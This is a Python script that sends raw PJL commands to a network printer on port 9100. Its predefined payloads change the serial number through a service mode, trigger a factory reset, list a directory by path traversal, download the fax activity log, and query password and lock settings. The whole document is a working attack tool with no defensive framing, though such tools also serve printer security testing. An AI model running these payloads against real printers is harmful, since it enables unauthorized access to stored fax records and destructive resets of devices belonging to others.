import socket
import sys

# quick and dirty hexdump
def dump_payload(msg):
    window=16
    for i in range(0,int(len(msg)/window)):
        arr=msg[i*window:(i+1)*window]
        for c in arr:
            print(hex(ord(c[0])).replace("0x","").ljust(2,'0'),end="")
            print(" ",end="")
        print("  |  ",end="")
            
        for c in arr:
            if ord(c)>=32:
                print(c,end="")
            else:
                print('.',end="")
        print()
        

msgs=dict()

msgs["setserial"]=chr(27)+"""%-12345X@PJL
@PJL SET SERVICEMODE=HPBOISEID
@PJL SET PAGES=0
@PJL SET SERIALNUMBER=TEST123
@PJL SET SERVICEMODE=EXIT
@PJL RESET
"""+chr(27)+"%-12345X"

msgs["factoryreset"]=chr(27)+"""%-12345X@PJL
@PJL DMCMD ASCIIHEX="040006020501010301040106"
"""+chr(27)+"%-12345X"

# embed snmp get, retrieve hrDeviceDescr (OID 1.3.6.1.2.1.25.3.2.1.3)
msgs["getname"]=chr(27)+"""%-12345X@PJL
@PJL DMINFO ASCIIHEX="000006030302010301"
"""+chr(27)+"%-12345X"

# Anzeige eines Verzeichnisses
msgs["dirlist"]=chr(27)+"""%-12345X@PJL
@PJL FSDIRLIST NAME="0:\\..\\Fax" ENTRY=1 COUNT=1000
"""+chr(27)+"%-12345X"

# Auslesen einer Datei
msgs["readfile"]=chr(27)+"""%-12345X@PJL
@PJL FSUPLOAD NAME="0:\\..\\Fax\\FaxActivityLog.xml" OFFSET=0 SIZE=1048576
"""+chr(27)+"%-12345X"

# Passwort Info
msgs["pwinfo"]=chr(27)+"""%-12345X@PJL
@PJL DINQUIRE PASSWORD
@PJL DINQUIRE CPLOCK
@PJL DINQUIRE DISKLOCK
"""+chr(27)+"%-12345X"

# Konfigurierte Variablen
msgs["variables"]=chr(27)+"""%-12345X@PJL
@PJL INFO VARIABLES
"""+chr(27)+"%-12345X"

# Konfigurierte Variablen
msgs["config"]=chr(27)+"""%-12345X@PJL
@PJL INFO CONFIG
"""+chr(27)+"%-12345X"


if len(sys.argv)<=2:
    print("usage: " + sys.argv[0] + " ip command")
    print();
    print("defined commands:")
    for i in msgs:
        print("   " + i)
    sys.exit(0)

target=sys.argv[1]
msg=msgs[sys.argv[2]]

socket.setdefaulttimeout(5)

# open socket and connect to target, then send payload
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,9100))    
    print("Sending challenge:")
    dump_payload(msg)
    s.send(msg.encode("ascii"))
except OSError:
    print("failed to connect/send")
    s.close()
    sys.exit(-1)

# receive response and print in raw format
print("Received response:")
data=b''
while True:
    try:
        data=s.recv(1024)
        print(data.decode("ascii"))
    except:
        sys.exit(0)